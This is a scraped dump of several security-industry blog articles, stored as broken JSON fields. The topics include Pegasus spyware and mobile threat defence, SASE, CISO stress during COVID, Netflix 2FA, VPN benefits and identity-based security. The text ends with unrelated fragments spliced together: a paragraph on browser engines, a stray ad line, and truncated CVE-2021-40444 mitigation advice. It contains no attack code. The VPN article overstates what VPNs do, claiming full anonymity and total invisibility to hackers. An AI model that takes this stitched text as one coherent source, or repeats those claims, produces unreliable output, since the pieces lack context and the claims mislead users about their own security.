        "text": "Forbidden Stories, a Paris-based non-profit organisation that seeks to ensure the freedom of speech of journalists, recently announced that the Pegasus Project surveillance solution by the Israeli NSO Group selected 50,000 phone numbers for surveillance by its customers following a data leak. \nThe NSO Group has always maintained that the purpose of the Pegasus Project was for governments to monitor terrorist activity. However, this recent story, if true, could suggest that the solution has been abused for a long period of time and used for other nefarious purposes.\nAs reported by Forbidden Stories, the leaked data suggests the wide misuse of Pegasus Project and a range of surveillance targets that include human rights defenders, academics, businesspeople, lawyers, doctors, union leaders, diplomats, politicians and several heads of states. The NSO Group continues to contend these assertions are based on wrong assumptions and uncorroborated theories. Whether these statements are true or false, they raise interesting considerations for enterprises and government organisations that have a requirement to protect the smartphones of employees who have access to sensitive information.\nPegasus Project is reported to provide NSO Group customers full control of target devices, which makes it a threat of interest. However, it is not the first mobile threat that organisations should be concerned about. In another contested case, SNYK suggested that the Sour Mint threat, a Software Development Kit (SDK) developed by the Chinese mobile ad platform provider Mintegral and used by more than 1,200 apps in the Apple App Store, was responsible for spying on users by activity logging URL-based requests through the app. It was reported that user activity is logged to a third-party server that could potentially include personally identifiable information (PII).\nWhere things get interesting with Sour Mint is its ability to evade defences by slipping through the Quality Assurance (QA) process of the Apple App Store, which goes to show that even the thoroughness of Apple\u2019s processes were not sufficient to detect malicious code in the case of this threat.\nSo, with the rise of mobile threats such as Pegasus Project and Sour Mint, how should organisations defend against such threats?\nFor a long time, the consensus among many was that Mobile Device Management (MDM) solutions were adequate mobile fleet device protection since widely used mobile operating systems such as Apple iOS sandboxed applications. However, the development of Sour Mint and Pegasus Project demonstrate that simply securing the mobile fleet through MDM is insufficient since malicious code can potentially exist in approved sanctioned applications in application stores and zero-day vulnerabilities exist in popular mobile operating systems. Organisations that are serious about advanced threats need to go beyond MDM to prevent devices from being compromised and data from being exfiltrated.\nThe security world\u2019s solutions to such threats are Mobile Threat Defence (MTD). Such solutions aim to prevent and detect advanced threats, such as malware, on iOS and Android devices. Gartner states that large-scale adoption of such solutions continues to be concentrated around highly regulated and high security sectors, and that organisations continue to primarily derive value from MTD solutions from an app-vetting and device vulnerability management.\nFrom a security reporting perspective, there is a lot of value in such hygiene activity. However, neither app vetting nor vulnerability management (i.e. detecting and remediating known vulnerabilities) would be effective in blocking attacks such as Pegasus Project and Sour Mint.\nUltimately, the deployment of MTD solutions to block advanced threats comes back to the risk profile and cyber maturity within a given organisation. MTD is a control that would generally be deployed within organisations with a higher maturity level, so it\u2019s important to get the basics right with app vetting and device vulnerability first before attempting to detect advanced threats.\nFor most organisations, the likelihood of being compromised by an advanced threat is low. However, those with information assets with a significant value should consider the use of MTD because where assets are of value, increased likelihood is sure to exist.\nEmerging use cases envisage MTD as a component of zero-trust network access (ZTNA) architecture and of an extended detection and response (XDR) system for detection and response, which can serve as a pilot for unified endpoint security. This is in addition to the use of MTD for mobile phishing protection.\n  Contributed by Neil Lappage, Public Sector Solutions Lead at ITC Secure, Member of ISACA Emerging Technology Working Group\n0\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "SASE: A beginner\u2019s guide",
        "author": "Derek Granath",
        "date": "December 15, 2020",
        "text": "In what now seems like a lifetime ago, in late summer 2019 Gartner first coined the phrase Secure Access Service Edge. Since then, \u201cSASE\u201d, as it is now more commonly referred, has generated the kind of hype the industry hasn\u2019t witnessed since SD-WAN first emerged around 2014. The promise was simple enough: enable enterprises to realise all of the long-held (but never fully realised) benefits of moving applications and workloads to the cloud and maintaining security.\nNow, seemingly every security vendor has a SASE play and marketing message to go alongside it. These messages, however, don\u2019t always align. A wide variety of differing perspectives have emerged from vendors and the media about SASE. Some herald it as a pure replacement for SD-WAN, others say that security is the primary function, with SD-WAN features a minor value add.\nThis diversity of messaging and positioning can cause additional confusion for enterprises trying to wrap their heads around the SASE topic. At its most basic level, Gartner defines SASE as the combination of SD-WAN and cloud-delivered security services. SD-WAN functions as a core component of the SASE architecture, and the combination of SD-WAN and cloud-delivered security ultimately deliver on the vision for a secure access service edge.\nIf you want to learn more about SASE, or perhaps you\u2019re looking to implement the framework within your own business, or out of pure interest, in this article I will share the basic principles around SASE, and offer some general, applicable tips for getting started.\nThe beginnings of a SASE architecture\nTypically, when building a SASE architecture an enterprise might start with just one transformational project. However, by the end of the project both WAN and security architectures must be transformed. This is because traditional WAN and security architectures are ill-suited for SASE. Routers and next-gen perimeter firewalls maintain security by backhauling cloud-destined app traffic through their data centres or hub sites (Figure 1). Unfortunately, this adds latency which impairs cloud application performance.\nTo eliminate this latency, SASE transforms both networking and security architecture, connecting branch site users directly and securely to cloud applications and services through the internet alongside cloud-delivered security services.\nThe Network Transformation\nLooking at network architecture, the SASE model pushes for a simplified or thin WAN edge. What this entails is placing only the required network functions at the edge, and in a single unified platform which wraps up: SD-WAN, routing, stateful zone-based firewall, advanced segmentation, WAN optimisation and application visibility and control.\nThe Security Transformation\nAs applications are increasingly hosted and accessed from anywhere (a very important point within the current remote working situation), traditional perimeter-base security models are  no longer effective.\nIn the SASE architecture, rather than hosting security services on complex to manage (and costly) next-gen firewalls within branch offices, it is far better to shift toward cloud-delivered security services. Ensuring that threat detection and mitigation capabilities are updated is far easier when these solutions are centralised within the cloud. In the same manner that SD-WAN replaces routers at branch offices, so too do cloud-delivered security services replace next-gen firewalls.\nThe Need for Automation\nWith SD-WAN and cloud-delivered security the necessary base components for SASE, any business looking to implement a secure access service edge will need to invest in SD-WAN first and foremost. SD-WAN is a healthy technology market and there are a lot of options out there. Advanced SD-WAN solutions, which are required to fully enable SASE, should rely on automated orchestration capabilities to ensure the complex infrastructure can run intelligently without too much oversight.\nAutomation should cover four key areas. Firstly, your SD-WAN solution should have the capability to automatically identify and classify applications on the first packet and dynamically steer them in accordance with centrally defined QoS and security policies. Secondly, it should enable the automation of the orchestration between the SD-WAN and proximity-based cloud-delivered security services from a single console.\nThird is the automated reconfiguration of the primary and secondary virtual tunnels to cloud security points of presence if a newer, closer location to the branch is deployed. This helps further minimise application latency. Lastly, and most importantly, any set up should be able to automatically failover to a secondary cloud security enforcement point should the primary become unreachable, so as to maintain application availability.\nDon\u2019t put your eggs in one basket\nFinally, as SASE is an ever-evolving framework, it is important that businesses avoid vendor lock-in, which provides the freedom of choice to adopt new security innovations as they emerge. Gartner itself predicts that by 2023, 20 per cent of enterprises will deploy a range of capabilities (it cites SWG, CASB, ZTNA and branch FWaaS) from a single vendor. That\u2019s four times as many as we\u2019re seeing today. It\u2019s much wiser to deploy a thin WAN edge platform that incorporates deep cross-vendor integration. This ultimately provides the best of both worlds.  \nContributed by Derek Granath, VP, Product and Technical Marketing, Silver Peak\n0\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "The challenges of being a CISO during the COVID-19 pandemic",
        "author": "Guru Writer",
        "date": "October 14, 2021",
        "text": "The pre-COVID-19 CISO. The global COVID-19 pandemic has been a tumultuous time for Chief information security officers (CISOs) who on any given day have a long and complicated list of responsibilities. CISOs are no strangers to disruption and challenges, but during the pandemic they have faced many disruptions it has caused and created a wealth of new challenges.\nSecuring a rapid transition to a remote workforce. COVID-19 accelerated the shift to remote working globally and, while the opportunity to work from anywhere has been welcomed by many globally, it has presented multiple security challenges. The most immediate challenge was as employees suddenly found themselves in a remote working model, CISOs had to adjust and determine how to establish secure connections for newly remote workforces who were suddenly working from home on devices that have never been part of the corporate domain before. In my organisation, we had the best-case scenario, to ensure business continuity, employees had been previously transitioned to company issued devices that were already managed by the security organisation.\nAn explosion of cyber risks and a complicated and constantly changing threat landscape. The initial challenge is that with a remote working model from the threat actor\u2019s perspective, all of these employees working remotely, isolated in their homes, and working on potentially unsecure devices and networks present a perfect storm opportunity.\nA collateral effect of the rapid expansion of remote working has been the related cyber risk of cyberattacks aimed at the remote workforce. Aside from the need to rely upon home Wi-Fi or other networks potentially lacking the protection available in a workplace setting, employees working remotely may forget or ignore the Security 101 basics, such as failing to use virtual private networks (VPN) or signing into work accounts using shared family devices.\nThreat actors have reinvented their attack approaches during the ongoing pandemic and attacks are skyrocketing against organisations and often by compromising employees working remotely. These approaches included COVID-19 oriented phishing and online scams; disinformation and misinformation campaigns; disruptive malware, including ransomware; data-harvesting malware; malicious domains and weaponised websites; and social engineering have become challenges. While the types of attacks may not be new, their volume has made it difficult to monitor and address in a timely manner, especially across a security organisation workforce that is already stretched thin.\nIn an effort to prevent such attacks in my organisation, there are controls implemented to mitigate the risks when an employee receives an email from an external source that has a link. When employees click on the link, recipients are not immediately getting the page on their browser or in their device. It first is isolated and vetted in a \u201cvetting zone.\u201d  However, technology by itself isn\u2019t enough to solve the problem because all it takes is one employee who falls victim to a combination of social engineering and technical attacks to inadvertently expose the organisation.\nBudget and resource constraints. While cyber challenges may not be addressed merely by throwing money or other resources at them, the severe retractions suffered by so many businesses have resulted and will likely continue to result in ongoing budget and resource And despite the recognition that cybersecurity is a priority, scarcities of funds and other resources may inevitably lead to fewer dollars and resources being committed to cybersecurity, aggravating the challenges faced by an already stretched workforce.\nFocus on work-life balance, empathy, and emotional intelligence. The challenge was at the start of the pandemic, CISOs and the security organisation went into firefighting mode like we do all the time in security continuing this cadence for so long the CISO and the security organisation can feel the stress of being overworked with no possible no end in sight.\nAs a CISO, I found myself and the security organisation fortunate to have done a good job planning for the unexpected as part of cyber resiliency. One of my key successes during the pandemic to alleviate the increased workload on my security teams by offering perks and incentives to boost morale. Some of these perks and incentives was awarding a \u201cyou day\u201d where an employee was given the day off with pay; allowing certain employees, naturally under COVID-19 safety precautions, to come back to the office for mental health reasons; engaging HR to coordinate sending employees a box full of goodies to show appreciation and for those with children at home got a box full of things for the kids to do; regulating the amount of hours any specific employee could work beyond the normal day; and thinking outside the box of how do we keep our people connected, healthy, and motivated when we\u2019re such a connected company by nature.\nOpportunities and positives on the security industry. As a member of ClubCISO, according to the latest Information Security Maturity Report, 88% of security executives said their existing security infrastructure has held up well during the pandemic which is very positive in the event of a global cyberattack which would have similar characteristics of the COVID-19 pandemic.\nDespite the array of extraordinary challenges CISOs have dealt with during the pandemic, there are several positive impacts to the security and cyber industry such as elevating awareness of security and how cyber impacts many aspects of a business; security issues and the consequent spending on addressing those issues; improving the defending of systems from attacks; dealing with cyber incidents; and the shift to remote working had improved work-life balance.\nAnother key positive is the increases in innovation and development. COVID-19 continues to be a major market disruptor that has led to unprecedented levels of innovation. Due to the lockdown, many companies have had to undergo rapid digitalisation and reinvent themselves with a new \u2018business as unusual\u2019 strategy. Some companies are using this wave of innovation to reimagine their business model; change or grow their market by taking technologies or services to market in record time, with accelerated product development times encouraged by new working practices and processes.\nA new era for cybersecurity.  The pandemic has ushered in a new era of cybersecurity. IT security professionals who raise their game and protect their companies\u2019 people, technology and data from new or heightened risks of more sophisticated cybercriminals will be crucial players in the economic turnaround.\nThis pandemic has given the CISO role and security industry an opportunity to redefine its role and value proposition. Security technology is no longer seen as devices that are solely used to keep people and property safe, but it is finally becoming a strategic tool to help improve business operations. AI-based security solutions and cameras are now able to go beyond security to capture valuable marketing and sales transaction data, analysing customer patterns and behaviour. By leveraging business and operational intelligence data that can pay for itself and directly affect the profitability of the organisation, the security industry is on the cusp of morphing from a tactical application to a truly strategic enterprise-shaping role.\nConclusion. The pandemic bestowed unprecedented challenges CISOs to the security industry. It also presented a wealth of new opportunities for the CISO role and security industry. Both trends are likely to continue as there remains a lot of speculation about what happens after the pandemic, as the pandemic takes from the security market with one hand while giving back with the other. Fortunately, the security industry continues to be in better shape than many others as the pandemic continues to evolve and play out.\n5\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "Netflix password crackdown: why users should be arguing for stronger measures",
        "author": "Andersen Cheng",
        "date": "July 19, 2021",
        "text": "It was long overdue, but Netflix has finally started to explore ways to address its password problem. By prompting viewers to prove that they live with the holder of that account by receiving a code, sent via text or email, they are hoping to weed out password freeloaders who, let\u2019s face it, are probably costing Netflix millions of dollars each year.\nThe issue of password sharing, which isn\u2019t just a Netflix problem, is almost universally down to the classic username and password approach to customer authentication. In addition to passwords being hard to remember and offering a poor user experience, they simply aren\u2019t a secure way of verifying that a customer \u201cis who they say they are\u201d.\nThis implementation of two-factor authentication (\u201c2FA\u201d) is just one of the many ways to address this problem, but it has understandably left many users worried, such as families that live in separate households that share one account. However, I firmly believe that it is a step in the right direction, not just for other subscription businesses to follow suit, but good for the digital security of users as a whole.\nWhat\u2019s special about 2FA?\nThe fact that 2FA has been chosen by Netflix as the option to clamp down on password sharing isn\u2019t really a surprise \u2013 the logical response from businesses when tightening up on security has been to layer additional \u201cfactors\u201d on top of the password. After all, by asking people to validate their identity based on \u201csomething they have\u201d, such as entering a one-time passcode sent to their mobile phone or email, it is possible to make the job of hackers much harder.\nIn the context of Netflix, the effect of this is that, if you are a long way down the chain of a shared username and password and you don\u2019t necessarily know the account holder, you won\u2019t be able to use its services and you\u2019ll be locked out of the account.\nOn paper, it is definitely an improvement of the previous model and will almost certainly lead to the reigning in of increasingly uncontrollable chains of password sharing.\nWhy users ought to be pleased\nI can sympathise with the hostile reaction to the news. At a first glance, it only adds a layer of frustration for the legitimate user and those that they are happy sharing their credentials with. Yet, there needs to be a balance and there seems to be a misconception that password sharing, even with people you know well, is not risky. This couldn\u2019t be further from the truth.\nFor example, while you might have shared your Netflix password with a friend in confidence, this doesn\u2019t mean that they can\u2019t share this with other people too. And those people could possibly share with others, and so on. You simply can\u2019t control how many people they then share it with, and how many people those people share it with. Before you know it, there could be a chain of more than 10 people that know your password without you knowing.\nBut it doesn\u2019t stop there. If your password does get shared, even if you do it in confidence, users often forget or ignore the fact they have zero control over the devices of the users they share their password with and their security posture, let alone if that password gets shared again more broadly. For example, what if they click on a phishing link or open a malware attachment and give cybercriminals access to their devices and stored information? Just one weak link in a password sharing chain can comprise your password.\nGoing a step further, if a cybercriminal does get hold of your password, credential stuffing allows them to use one password and test it against hundreds of other sites. So, if they have your password \u2013 the password that is probably the same across most of your accounts and devices \u2013 hackers can potentially get into your other accounts and devices too. Your exposure could quickly and quite easily extend far beyond Netflix.\nUltimately, 2FA and clamping down on password sharing is a small inconvenience and an extra few pounds each month, for a lot more peace of mind for users when it comes to their digital security.\nA step closer to biometrics?\nA question that will linger though is whether 2FA goes far enough. Although more secure than the veteran username and password model, 2FA still has obvious security flaws. The weakness with all device-based approaches is that you are not authenticating a specific person, rather you are allowing whoever has access to a device to authorize the event. For example, if someone gets my PIN and \u201cunlocks\u201d the authorization, they could circumvent an authenticator app on my phone with a PIN. The reality is that it can\u2019t stop credential sharing entirely.\nWhile not on the immediate horizon, if Netflix and other subscription businesses were to truly wipe out password sharing and secure users\u2019 digital identity, they would most likely opt for a multi-factor authentication (MFA) approach based on biometrics. In other words, rather than asking users to remember a password, biometric identifiers such as a voice and face print can be stored so the user can be authenticated on any device they\u2019re logging in from. Crucially, credentials can\u2019t be lost, stolen or shared when they are your own face and voice patterns \u2013 the legitimate user must actually be present to log in.\nIn the context of Netflix, this could work by ensuring all members of a household are registered so they can log in by presenting their face or voice in under 30 seconds. Importantly, people outside the household cannot \u201cborrow\u201d a biometric ID, meaning illicit account sharing would be all but eradicated.\nYet, there are understandable concerns here despite it being the most obvious way to stamp out freeloaders entirely. Most notably, the prospect of a single, global and commercially driven entity like Netflix having access to its customers\u2019 biometric data is of particular concern.\nWhether other subscription services will follow in the footsteps of Netflix isn\u2019t too relevant, but it\u2019s clear that there does need to be a simple, secure and privacy preserving solution to the password sharing pandemic.\nContributed by Andersen Cheng, CEO and founder, Nomidio\n  4\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "7 key advantages of using a VPN when working from home",
        "author": "Rohail Abrahani",
        "date": "August 27, 2020",
        "text": "VPN software has been prevalent in the digital market for decades now, however for most SMEs, the use of a virtual private network gained immense popularity more recently. Based on a recent report, hackers are using the coronavirus pandemic to spread malware on a colossal scale.\nSince the COVID-19 pandemic, people are now often working from home, and it has become the new norm for many organisations. This has highlighted the advantages of using a VPN service on home networks to avoid security breaches.\nUsing a VPN connection to encrypt online data is crucial to safeguard confidential information. and if users have to work on company-specific platforms, and are using their home network, the risk of getting hacked increases.\nHere are some of the benefits of using a VPN while working from home.\n1.     Mask your real IP from hackers\nUsers can mask their actual IP address while they surf online to ensure their data is safe from malware attacks.\nAll consumer-specific information is viewable to third parties as they track a users\u2019 ISP. Surprisingly, users can hide their data by altering their location with the VPN server. This way, hackers will not be able to see any of the users\u2019 online activities. Instead, they can only see encrypted statistics that will protect the users\u2019 online identity.\n2.     Increased productivity during work from home\nHome networks are susceptible to cyber-attacks, which have increased 37% during the COVID-19 outbreak, limiting users from utilising the internet to its full potential.\nHowever, a VPN will safeguard online privacy and remove the barriers that fall under the radar of limited bandwidth issues and low connection speeds.\nConsidering the need for people to converse with their team members abroad, a VPN will provide a seamless connection. It is possible to use a server based on where you want to collaborate. Using country-specific servers will give the fastest speed so that discussions can be conducted during meetings without any interruptions.\n3.     Online anonymity / bypass geo-restrictions\nWith a VPN, users can log in to any website and application without any  fear of being traced because the connection will provide full-fledged anonymity.\nSites that allow people to access from a particular country will block IP instantly. In that case, using  VPN software will enable access to those websites by using a server in that location. For Example, you can only access the streaming platform BBC iPlayer in the UK.\nTherefore, to get permission to access such sites, users need to use a virtual private network. It will bypass the local content restrictions and allow users to access it anonymously.\n4.     Protect multiple devices at home\nUsers have a range of different devices at home, but protecting all connected systems remains a daunting task. With a single VPN connection, users do not need to install multiple software to protect each device being used.\nBy subscribing once to a VPN software, users are able to safeguard all their devices, be it laptop, tablet, Apple TV, or any other connected device . Multiple platforms can be protected via a single VPN account.\n5.     Secure your public Wi-Fi connection\nWhen working remotely and facing issues with the home network, users may then have to access public Wi-Fi. But, this poses a problem as, when a public network is used it is not a safe option and it puts online identities on risk.\nAccessing free Wi-Fi exposes online privacy to various unwanted threats, causing serious dangers afterwards. TYour digital footprint can be tracked and hostile actors can keep a check on the activities users are performing. Public Wi-Fi will also make confidential information vulnerable to hackers.\nPublic Wi-Fi problems can be circumvented by using a VPN connection. It will protect data in real-time with its strict zero-logs policy and high-tech encryption features.\n6.     P2P file sharing facility on digital platforms\nDigital media sharing is arduous when users are operating from home. Using a VPN software allows users to leverage P2P file-sharing protocols that will help in sharing massive files without any hassle.\nBesides that, people using platforms such as the Zoom conference to collaborate and share files with their team members reported a threat to their online privacy. The video conferencing and media sharing service are not encrypted with security protocols, which can leads to violation of user rights.\nIt avoids bandwidth and file downloading issues because of the speed-optimised servers. Even connecting with your team members in different locations, users can share data in the fastest way possible.\n7.     Overcome price discrimination issues\nAnother advantage of using a VPN is on high-end commodities. Most companies charge prices based on the geo-locations of consumers. Online stores are more likely to display different rates to customers specific to their location. Hence, using a VPN will enable users to eliminate this price discrimination by changing their IP to the online store location and take advantage of discounted services.\nFinal Words\nIn a nutshell, a VPN connection will protect privacy from being threatened. While it also boosts business productivity when surfing online. Research VPNs and the security features they offer, then choose a VPN service that fulfils your security needs.\nContributed by Amtul Rafay, Cybersecurity writer.\n4.2\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "title": "The four As of identity-based security",
        "author": "Dan Conrad",
        "date": "August 20, 2021",
        "text": "In the famous words of David Byrne, there is no time for \u201cdancing, or lovey dovey\u201d when it comes to security. In a world where technology is constantly evolving, it is important to always stay on top of protecting confidential and sensitive information. The standard go-to for security within organisations is the account-based approach; however, this exposes the issue with specialised IT resources being so heavily involved in identity and account administration.\nThe way accounts are secured varies across sectors and companies; some believe securing the perimeter is vital, while others rely on encryption and data protection or zero trust access with controls. Ultimately, identity is the core of security \u2013 making sure that the right people have the right access to the right resources in the right ways at the right time. For this reason, organisations should be moving away from account-based administration of network resources to an approach that uses identities to strengthen cybersecurity and allow adherence to Zero Trust principles.\nAuthentication \u2013 This is all about ensuring the identity of the person or non-human (e.g. a bot) logging onto a system. Every application or system, whether it\u2019s on-prem or cloud based, includes a type of authentication, the most common being a username and password. Most organisations will use Microsoft Active Directory (AD) and Azure Active Directory (AAD) for authentication, or they might augment a majority of the workload with technologies to unify the logins. While authentication is a vital step toward identity-based security \u2013 it is not adequate on its own.\nAuthorisation \u2013 Authorisation focuses on the parameters surrounding user permissions once they have been authenticated. This can be influenced by several variables including file and application permission and sharing and finely defined access rules based on role, location and circumstance. Unfortunately, this is often where security gaps are created. Users can potentially be awarded the wrong rights, while others can forget to terminate the rights they no longer need, which gives threat actors an opportunity to exploit a weakness. To avoid this, a Zero Trust security model should be implemented in which no user receives unnecessary or out-of-date permissions.\nAdministration \u2013 This ensures that authentication and authorisation are completed correctly. In order to achieve this there are many managerial tasks that must be performed on the account, ranging from requesting access to fulfilling a specific request and then terminating this access when it is no longer needed (this is also called provisioning). This process encompasses role management to assign the right people to the right authorisation for the right reasons. From a Zero-Trust standpoint, this step is essential to issue the necessary permissions at the right time and terminate them when they are no longer needed.\nAudit \u2013 The last and, arguably, most important step is also often called governance. This proves that all prior steps are completed to an adequate standard of security, and it can be proven. Occasionally it also ensures that the correct privacy regulations are complied with and that any best practice frameworks have been followed.\nThe fact is that the job of IT professionals is to keep the systems running and users productive, though, unfortunately, they often become involved in the day-to-day use of specific applications by a specific user due to using an account based approach to security. This is because IT employees have the most knowledge when it comes to making the correct authorisation decisions, therefore the administrative responsibilities often fall on them as opposed to the line-of-business where it should be. They turn into a sort of \u2018help desk\u2019, while their normal tasks, including critical IT initiatives, are often left unfinished. When using an account-based approach, the decisions surrounding access and permissions fall to IT, specifically because they default to the resource in control of a specific account on a specific application. To avoid this, organisations should attempt to shift from a disjointed account-based strategy to a unified identity-centric approach by using a unified identity security platform. This reduces complexity, streamlines operations, empowers security teams and enables governance, while the IT teams are left out of the mundane tasks.\nIdentity-based security can be achieved by approaching it similarly to Maslow\u2019s pyramid of hierarchical needs; there are certain steps that must be completed before moving forward. Access is the foundation for everything \u2013 if users can\u2019t access the system, the rest of the process can\u2019t begin. This is followed by making sure everything is done securely and adding certain controls, such as policies, standards, guidelines and procedures, which influence and improve the security of the system. Then comes management, which is the ability to audit and report on all the lower levels of the hierarchy. And finally, governance. This step can only be realised if all other steps have been completed correctly.\nSo, it\u2019s easy to see why using an account-based approach to security is bound to fail, because it focuses too heavily on maintaining the foundational levels and, therefore, cannot achieve governance. The issue of an account-based approach lies in the fact that companies often have individual employees who are capable of completing the various tasks that move them up the pyramid, without knowing why. Each level of the pyramid would need to be accomplished separately for each account. This creates a disjointed process and makes it easier for bad actors to exploit security gaps.\nTherefore, rather than wasting time on granting access via accounts and securing individual systems, identity-based security gives organisations the power to achieve their business objectives much faster. This is because agility is dependent on governance, which can be realised with the identity-based approach to security. Organisations will be able to better enforce that activities are being performed correctly, with the correct authorisation, while at length, achieving governance across the entire range of systems, user populations and real-world needs.\nContributed by Dan Conrad, field strategist at One Identity.

        "date": "June 16, 2021",
        "text": "The coronavirus pandemic has put cybersecurity under a renewed spotlight. New ways of working and a fragmented workforce has challenged CISOs and their security teams; as the threat landscape has grown, nefarious actors have jumped at the chance to exploit the ever-fluid situation.\nWe have seen attacks grow in frequency and sophistication; Telstra\u2019s Agility Report, which surveyed 500 senior IT and business decision makers across Europe was released earlier this year, and revealed that over half (65%) of respondents saw a dramatic rise in cyberattacks on their organisation during the pandemic. In addition to hacking efforts, businesses reported increased pressure from phishing (44%), fake contact tracing apps and calls (43%) and ransomware (43%), with the greatest increase in incidents in the energy, oil, gas and utilities sector (80%).\nDespite this, the findings from ClubCISO\u2019s eighth annual Information Security Maturity Report, is positive. The report indicates that years of innovation and hard work from CISOs has in fact resulted in upheld security defences throughout COVID-19.\nThe Information Maturity Report showed 88% of CISOs surveyed believe their security capabilities have held up over the last twelve months \u2013 a much stronger result than when asked in the early days of the pandemic (77%). In addition, 55% of CISOs say their boards take a balanced view, prioritising prevention and response in equal measure when it comes to their defences \u2013 a significant jump from 38% in 2020. 86% of CISOs also believe their organisation now views security as being as important as they do; a considerable increase from 65% pre-pandemic.\nThis shows the unique opportunity Covid-19 has afforded CISOs to further support the need for change within their organisations and reinforce security as a key business function. CISOs have successfully built and maintained defences that have upheld at one of the most crucial times for businesses in recent memory. This resilience has helped organisations navigate the pandemic and minimise the risk of both reputational and economic damage.\nThe report shows tangible, valuable improvements in security culture and the ways in which CISOs are making their organisations safer even though the engagement model may have changed. Encouragingly, 68% of CISOs agree their organisations now have a positive security culture, compared to only 45% in 2020. In addition, 61% of CISOs believe their organisations are making progress or feeling they exemplify best practice in security culture \u2013 a considerable increase from only 39% in 2020.\nHowever, despite clear improvements in security culture and resilience, the pandemic has placed employees across the board under unprecedented levels of stress. Today\u2019s unrelenting threat landscape means CISOs have one of the toughest jobs on the organisational chart, having to deal with securing companies that might have been through rapid transformational change.\n64% of CISOs surveyed have experienced an increase in stress over the last 12 months and the report outlines a similar situation for their team; 6% of CISOs still report their team experiencing \u2018unbearable stress\u2019 and 36% believe the stress their teams are under negatively affects performance.\nAlongside this, team skills and resource shortages continue to be detrimental to the mental health of CISOs and their teams; 45% cite security team skills and resourcing greatly contribute to their stress levels, whilst 53% see insufficient staff as a key issue when delivering against objectives.\nThis year\u2019s ClubCISO report clearly demonstrates how CISOs from across the globe have come together as a community to address key issues in the face of unprecedented adversity.\nHowever, there is always more to be done. CISOs must continue to push forward in hiring from a diverse pool of talent and attract an inclusive team that can alleviate current pressures. Moreover, CISOs and their organisations must actively work to ensure the mental wellbeing of their team is a central focus.\nThe pandemic has brought us to a pivotal moment for the industry and CISOs must ensure they keep security at the heart of their organisations and continue to build on the good work that has been actioned over the last 12 months.\n0\nArticle Rating\nFacebook\nTweet\nLinkedIn",

        "text": "A CISOs workday is riddled with high-stress situations as they constantly battle the deluge of threats emerging from the ever-expanding threat landscape. Therefore it is no wonder that the majority of technology leaders are feeling stressed. \n  In recent years the challenges that CISOs face have only intensified. Since the pandemic, security professionals have had to carry out a mass overhaul of their companies systems and infrastructure in order to facilitate a work-from-anywhere environment. When they once had to secure an internal network containing a limited number of devices, they must now secure an unknown expanse of devices belonging to a range of unprotected, unknown networks. \n  According to OneLogin\u2019s recent IAMokay Mental Health Survey of 250 global tech leaders, the stress of the cybersecurity environment is taking a toll on security professionals. The survey found that over 77% of respondents felt that the pandemic has lead to an increase in work-related stress. While 86% have experienced an increase in workload since the pandemic, with a quarter of which having seen a significant increase in workload. The survey also reported that as well as increased stress and workload, a majority of respondents reported an increase in work hours, with 26% believing this increase to be significant. \n  Despite the increase in stress, workload, and work hours, most of the tech leaders felt that their organisation care about their wellbeing, with three-quarters of the survey respondents believing that their employers valued their mental health. Furthermore, the majority of technology professionals are turning to healthy coping mechanisms for their increased stress. OneLogin\u2019s survey found that the primary stress management technique for IT leaders was exercise. Over 80% of respondents turned to exercise as a way to cope with stress, while 40% relied on meditation. \n  Unfortunately, not all of the technology leaders surveyed felt that they were able to cope with their stress in such positive ways, as some turned to unhealthy stress management techniques. Approximately 24% self-medicated to manage their stress, turning to narcotics, prescription medication or alcohol in order to cope with the difficulties of their jobs. \n  Dr. Robin Massey, is an industrial organisational psychologist, who has extensive experience in helping industry leaders understand how the state of their body influences their performance and productivity. Massey believes that \u201cHistorically, business has been preoccupied with efficiency, while sacrificing human relationships. On some level, this perspective may have worked in the past, but times have changed. What we know is the current state of the body influences behaviours, feelings, and thinking. Therefore, it is important to understand how physiological factors are interrelated with the relational and psychological.\u201d Massey, explains how essential stress management techniques are for leaders, saying that, \u201cpractising just one to two changes can have a significant compound effect over time.\u201d\n  The American Psychological Association (APA) has created a list of stress management methods for leaders to practice in order to deal with work-related stress, with some examples below:\nRecognize the physical warning signs of stress: Stiff muscles, headaches, teeth grinding, and stomach-aches are all physical reactions to stress. Pay attention to these symptoms and focus on self-care.\nHit the pause button: Pausing to reset and focus is very important when you feel overwhelmed. Adopt a routine of 5- to 10-minute breaks each hour to assess your stress signals and emotional needs. \nPrioritize self-care:  Leaders need to recharge, recover, and stay fuelled. Movement and exercise is necessary for improving mood and physical well-being. Restorative activities include outdoor recreation, mediation, deep breathing, maintaining a proper diet, and talking with friends and family.\n5\nArticle Rating\nFacebook\nTweet\nLinkedIn",

Mozilla products such as Firefox and Thunderbird are based on a similar idea, known as Gecko. On iOS, interestingly, Apple not only uses WebKit as the core of its own browser, Safari, but also mandates the use of WebKit in browsers or browser-like apps from all other vendors. That\u2019s why Firefox on iOS is the only version of that product that doesn\u2019t include Gecko \u2013 it has no choice but to use WebKit instead. \n \t\t\t\t \n\t\t\t\t \r\n   \r\n     \r\n      OTHERS STOP AT NOTIFICATION.

Don\u2019t be tempted to look at content just because an email or a document happens to align with your interests, your line of work, or your current research. That doesn\u2019t prove that the sender actually knows you, or that they can be trusted in any way \u2013 that information is probably publicly available via your work website or your own social media posts.\n Don\u2019t be tempted to break out of Office Protected View.  By default, Office documents received via the internet (whether by email or web) open in a way that prevents active content such as Visual Basic macros and ActiveX controls from running. If you see a yellow bar at the top of the page, warning you that potentially dangerous parts of the document were not activated, resist clicking the  [Enable Content]  button, especially if the text of the document itself \u201cadvises\u201d you to!\n Consider enforcing Protected View permanently for all external content.  System administrators can enforce network-wide settings that prevent anyone from using the  [Enable Content]  option to escape from Protected View in Office. Ideally, you should never need to trust so-called active content in external documents, and you sidestep a wide range of attacks if you prevent yourself from enabling any active content altogether.\n Disable ActiveX controls that use the MSHTML web renderer.  Sysadmins can enforce this with  network-wide registry settings  that stops ActiveX controls that arrive in new documents from working at all, regardless of whether the document is opened in Protected View or not. This forms Microsoft\u2019s official mitigation for the CVE-2021-40444 vulnerability.\n Disable the use of ActiveX in Office.  If you don\u2019t need ActiveX in Office at all, get rid of it altogether.\n Keep your eyes peeled for a patch from Microsoft.  Next Tuesday (2021-09-14) is the September 2021 Patch Tuesday date; let\u2019s hope Microsoft gets a full-blown fix ready by or before then!\n \n \n GROUP POLICY SETTINGS AND REGISTRY 